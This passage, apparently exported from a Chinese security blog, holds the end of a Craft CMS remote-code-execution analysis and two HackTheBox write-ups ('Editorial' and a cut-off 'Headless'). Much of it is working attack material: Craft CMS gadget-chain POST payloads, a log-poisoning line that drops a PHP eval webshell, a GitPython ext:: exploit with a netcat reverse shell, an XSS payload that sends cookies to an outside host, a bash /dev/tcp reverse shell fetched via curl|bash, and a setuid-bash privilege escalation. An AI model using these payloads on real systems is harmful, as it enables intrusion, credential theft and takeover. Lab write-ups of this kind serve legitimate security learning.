<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240902201223309.png"></p>
<p>把下载的源码复制到网站对应根目录下，打开整个项目文件夹</p>
<p>然后打开composer</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240902201850168.png"></p>
<p>执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php craft setup</span><br></pre></td></tr></table></figure>

<p>不过出现报错，找不到类</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240902202252956.png"></p>
<p>打开php.ini配置文件添加以下内容即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extension=php_intl.dll</span><br></pre></td></tr></table></figure>

<p>继续安装，输入配置数据库信息以及用户名（xdebug的问题忽略）</p>
<p>访问<code>http://craftcms/web/index.php</code>，搭建成功</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240902202642408.png"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="FnStream类"><a href="#FnStream类" class="headerlink" title="FnStream类"></a>FnStream类</h3><blockquote>
<p>全局搜索<code>__construct()</code>进行查找，最终在FnStream类找到，并且<code>call_user_func()</code>可控</p>
</blockquote>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>POST传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,&quot;__construct()&quot;:[&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903154331447.png"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>我们查看官方报告，补丁文件在<code>src/controllers/ConditionsController.php</code>的<code>beforeAction()</code>方法</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903153631438.png"></p>
<p>首先接收请求参数config并对json数据解码，然后把name键名的值赋值给<code>$config</code></p>
<p>然后调用ArrayHelper类的<code>remove()</code>方法，我们跟进一下发现最终是继承的<code>BaseArrayHelper</code>类，<code>remove()</code>方法移除new-rule-type的元素，接着调用<code>getConditions()</code>方法获取条件服务对象，再调用<code>createCondition()</code>方法创建条件对象</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903163348346.png"></p>
<p>再第42行下断点一步步调试，这里传进去的参数分别为ElementCondition类和恶意代码数组</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903164144044.png"></p>
<p>跟进一下，这里foreach遍历<code>$properties</code>数组给<code>$object</code>对象属性赋值（即ElementCondition类）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">configure</span>(<span class="params"><span class="variable">$object</span>, <span class="variable">$properties</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$object</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先为<code>$name</code> 和<code>$value</code>赋完值，然后由于不存在as键名，那么给不存在的属性赋值就会触发<code>__set()</code>魔术方法，我们往上查找ElementCondition类是继承哪个父类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElementCondition -&gt; BaseCondition -&gt; Component</span><br></pre></td></tr></table></figure>

<p>最终在<code>\vendor\yiisoft\yii2\base\Component.php</code>找到<code>__set()</code>方法</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903203851372.png"></p>
<p>这里将as与set拼接后不存在此方法，由于属性名为as直接进入到第188行的elseif语句。然后如果 <code>$value</code> 是一个 <code>Behavior</code> 实例，直接使用；否则调用 <code>Yii::createObject()</code> 方法创建实例，跟进一下</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903205612642.png"></p>
<p>直接看向第362行，这里将class键名就赋值给<code>$class</code>然后删除数组中的class键，继续调用<code>Container::get()</code>方法</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903211917554.png"></p>
<p>由于FnStream类不是Instance类的子类，并且不存在<code>$_singletons[$class]</code>键，所以进入elseif语句调用<code>build()</code>方法</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903221718543.png"></p>
<p>这里先调用<code>getDependencies()</code>方法，继续跟进</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903221758762.png"></p>
<p><code>_reflections</code>类的键不存在该类，执行try语句对FnStream类实例化。往下看然后调用<code>getConstructor()</code>方法，最后return返回值</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240903222729094.png"></p>
<p>回到<code>Container::build()</code>，如果存在<code>__construct()</code>键，赋值给<code>$addDependencies</code>然后删除。往下跟进到第422行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$object = $reflection-&gt;newInstanceArgs($dependencies);</span><br></pre></td></tr></table></figure>

<p>调用<code>newInstanceArgs()</code>实例化（即是FnStream类），继续跟进</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240904000055673.png"></p>
<p>遍历<code>$methods</code>数组，将<code>$name</code>与<code>_fn_</code>进行拼接，使得FnStream类出现<code>_fn_close</code>属性并且值为null</p>
<p>回到<code>build()</code>方法，遍历数组config数组赋值，返回object对象</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240904000406273.png"></p>
<p>一步步调试跟进，最后调用<code>__destruct()</code>魔术方法，由于存在<code>$_fn_close</code>属性成功执行phpinfo</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240904000447823.png"></p>
<h3 id="PhpManager类"><a href="#PhpManager类" class="headerlink" title="PhpManager类"></a>PhpManager类</h3><blockquote>
<p>POP链跟的前面部分和利用FnStream类的链差不多，都是经过以下部分去实例化类，区别在于利用的类不同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ConditionsController::beforeAction() -&gt; Component::__set() -&gt; Container::get() -&gt; Container::build()</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>先利用hackbar写入恶意代码到日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>然后日志文件包含即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;assignmentFile&quot;:&quot;D:/phpstudy_pro/WWW/craftcms/storage/logs/web-2024-09-04.log&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240904220349458.png"></p>
<p>注意这里的<code>assignmentFile</code>是PhpManager类的属性，换成其他属性也行。还有就是需要完整日志路径，不然会报错。进一步利用的话由于单双引号会被反斜杠转义，考虑直接使用反引号命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &lt;?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d &gt; shell.php`;?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>前面链子一样我们就不分析了，直接跟进到Container::getDependencies()&#96;的第507行</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240905215531196.png"></p>
<p><code>$class</code>值为<code>\yii\rbac\PhpManager</code>，所以进行实例化PhpManager类</p>
<p>调用<code>init()</code>方法初始化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">init</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;itemFile = <span class="title class_">Yii</span>::<span class="title function_ invoke__">getAlias</span>(<span class="variable">$this</span>-&gt;itemFile);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;assignmentFile = <span class="title class_">Yii</span>::<span class="title function_ invoke__">getAlias</span>(<span class="variable">$this</span>-&gt;assignmentFile);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;ruleFile = <span class="title class_">Yii</span>::<span class="title function_ invoke__">getAlias</span>(<span class="variable">$this</span>-&gt;ruleFile);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里出现了<code>load()</code>方法，跟进一下</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240905215758627.png"></p>
<p>定义了空数组，然后调用<code>loadFromFile()</code>并传参进行赋值，继续跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">loadFromFile</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对传进来的文件进行判断，文件包含并返回执行结果</p>
<p>我们ctrl加左键查看下传进去的参数，发现都可控那么就可以尝试进行包含恶意代码</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240905220150968.png"></p>
<p>哪些文件可以被我们注入恶意代码并且用来文件包含呢，我们查看下官方文档，注意到在目录<code>storage/logs/</code>下存在文件<code>web-[Y-m-d].log</code>，按照年月日命名并且里面存储了web的请求内容，我们直接包含这个文件即可实现RCE</p>
<p><img src="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240905220430602.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://cloud.tencent.com/developer/article/2365764">https://cloud.tencent.com/developer/article/2365764</a></li>
<li><a href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>Editorial</title>
    <url>/article/Editorial-HackTheBox.html</url>
    <content><![CDATA[<p>SSRF、gitpython远程代码执行漏洞</p>
<span id="more"></span>

<h1 id="Editorial"><a href="#Editorial" class="headerlink" title="Editorial"></a>Editorial</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v 10.10.11.20</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)</span><br><span class="line">|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://editorial.htb</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>发现重定向<code>http://editorial.htb</code>，添加域名到<code>/etc/hosts</code></p>
<p>访问80端口，类似于阅读书籍的网站</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801113508567.png"></p>
<p>ffuf扫描不存在子域名，那么直接dirsearch扫下目录</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801114009156.png"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>存在文件上传路径，访问一下<code>/upload</code></p>
<p><img src="/article/Editorial-HackTheBox/image-20240801114049056.png"></p>
<p>尝试文件上传一句话木马，不过并没有回显上传路径</p>
<p>观察前面可以输入网址加载书籍信息，我们在本机监听下80端口，输入我们本机的ip后点击Preview</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801120106787.png"></p>
<p>成功响应，试了半天弹shell不成功。不过由于存在ssrf漏洞，我们可以抓包探测端口情况</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801122142363.png"></p>
<p>发现5000端口的回显包长度不一样</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801124459211.png"></p>
<p>我们访问此路由，发现存在信息泄露</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801124710186.png"></p>
<p>路由信息如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;messages&quot;:[&#123;&quot;promotions&quot;:&#123;&quot;description&quot;:&quot;Retrieve a list of all the promotions in our library.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/promos&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;coupons&quot;:&#123;&quot;description&quot;:&quot;Retrieve the list of coupons to use in our library.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/coupons&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;new_authors&quot;:&#123;&quot;description&quot;:&quot;Retrieve the welcome message sended to our new authors.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/authors&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;platform_use&quot;:&#123;&quot;description&quot;:&quot;Retrieve examples of how to use the platform.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/how_to_use_platform&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;],&quot;version&quot;:[&#123;&quot;changelog&quot;:&#123;&quot;description&quot;:&quot;Retrieve a list of all the versions and updates of the api.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/changelog&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;latest&quot;:&#123;&quot;description&quot;:&quot;Retrieve the last version of api.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>/api/latest/metadata/messages/authors</code>路由应该是书籍作者的信息，继续使用ssrf内网探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/api/latest/metadata/messages/authors</span><br></pre></td></tr></table></figure>

<p>也是向上面那样回显路由信息，跟进一下</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801125154523.png"></p>
<p>用户信息如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;template_mail_message&quot;:&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>得到作者个人信息<code>dev:dev080217_devAPI!@</code>，我们前面在扫描的时候就知道22端口是开放的</p>
<p>直接ssh登录，拿到user的flag</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801125549641.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>dev用户使用不了sudo命令，查看<code>/home</code>还有prod用户，那么只能切换到prod才行</p>
<p>我们查看apps发现隐藏目录<code>.git</code>，跟进到<code>logs</code>日志文件</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801133846725.png"></p>
<p>我们查看下<code>b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</span><br></pre></td></tr></table></figure>

<p><img src="/article/Editorial-HackTheBox/image-20240801133047041.png"></p>
<p>得到prod用户的密码<code>080217_Producti0n_2023!@</code>，su切换下用户<code>sudo -l</code>查看一下</p>
<p><img src="/article/Editorial-HackTheBox/image-20240801134255970.png"></p>
<p>cat查看一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> git <span class="keyword">import</span> Repo</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;/opt/internal_apps/clone_changes&#x27;</span>)</span><br><span class="line">url_to_clone = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">r = Repo.init(<span class="string">&#x27;&#x27;</span>, bare=<span class="literal">True</span>)</span><br><span class="line">r.clone_from(url_to_clone, <span class="string">&#x27;new_changes&#x27;</span>, multi_options=[<span class="string">&quot;-c protocol.ext.allow=always&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>接受一个url参数初始化git仓库</p>
<p>只有这一个脚本能利用，我们查看下GitPython版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GitPython             3.1.29</span><br></pre></td></tr></table></figure>

<p>网上搜索找到gitpython远程代码执行漏洞，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> git <span class="keyword">import</span> Repo</span><br><span class="line">r = Repo.init(<span class="string">&#x27;&#x27;</span>, bare=<span class="literal">True</span>) r.clone_from(<span class="string">&#x27;ext::sh -c touch% /tmp/pwned&#x27;</span>, <span class="string">&#x27;tmp&#x27;</span>, multi_options=[<span class="string">&quot;-c protocol.ext.allow=always&quot;</span>])</span><br></pre></td></tr></table></figure>

<p><code>clone_prod_change.py</code>脚本第一个参数可控，刚好对应exp的<code>ext::sh -c touch% /tmp/pwned</code></p>
<p>由于靶机不回显，可以尝试结果外带</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c cat% /root/root.txt% &gt;% /tmp/flag&quot;</span><br></pre></td></tr></table></figure>

<p>或者反弹shell也行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c rm% /tmp/f;mkfifo% /tmp/f;cat% /tmp/f|/bin/bash% -i% 2&gt;&amp;1|nc% 10.10.16.9% 1028% &gt;/tmp/f&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Editorial-HackTheBox/image-20240801160644435.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>CVE-2022-24439</p>
<ul>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Headless</title>
    <url>/article/Headless-HackTheBox.html</url>
    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
<span id="more"></span>

<h1 id="Headless"><a href="#Headless" class="headerlink" title="Headless"></a>Headless</h1><p>信息搜集</p>
<p>使用nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>

<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
<p>可以发现5000端口是开放的，继续扫一下目录</p>
<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>提交后会发现提示Hacking</p>
<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
<p>（利用fetch函数对我们服务器发送网络请求）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>

<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
<p>不过好在是拿到了admin的cookie</p>
<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
<ol>
<li><p>首先在本地创建shell.sh文件，写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后用curl命令去读取我们的shell.sh文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
</ol>
<p>成功反弹shell</p>
<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
<p>得到user的flag</p>
<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
<p>我们尝试用sudo提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
<p>我们strings命令查看下得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>重点看下面这段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
<ol>
<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后赋予该sh脚本的执行权限</p>
